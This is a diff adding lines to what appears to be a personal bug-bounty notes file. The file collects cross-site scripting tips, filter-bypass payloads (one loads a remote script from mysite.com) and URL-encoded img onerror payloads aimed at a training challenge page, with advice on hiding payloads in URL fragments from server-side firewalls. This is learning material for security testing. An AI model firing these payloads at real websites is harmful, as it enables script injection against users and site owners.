@@ -3,6 +3,9 @@
 ### XSS
 - I love it when a site creates a filter to 'try' prevent something like XSS (or even certain file extensions from being uploaded:D). In this case, [xss filter bypass: </script><%0dscript%20src=\http://mysite.com/yay.js>](https://www.bugbountynotes.com/forum/viewpost?id=100)
 - Have you ever come across an issue, where you could pop XSS but parenthesis () gets filtered ? this payload ``onfocus="alert`1`"autofocus=`` will bypass that problem.
+- "URL-encoding payload symbols" AND "The fragment(`#`) isn’t sent to the server - this means that no server-side firewall can see it, so it cannot stop attacks coming from this direction."
+  - `https://www.bugbountytraining.com/challenges/challenge-10.php#?message=%3Cimg%20src%3Ddumm%20onerror%3Dalert(%22xss%22)%3E`
+  - `https://www.bugbountytraining.com/challenges/challenge-10.php?message=#%3Cimg%20src%3Ddumm%20onerror%3Dalert(%22xss%22)%3E`
 - If you open the url in the browser and see nothing but blank page, do not assume there is nothing there.
   - ALWAYS check the source code. There might be a bunch of JavaScript or e.g. some commented source code from server.
 - ALWAYS check the full response on any request. Errors can sometimes give u the keys to the kingdom if u actually figure out what ur looking at witin the error response.
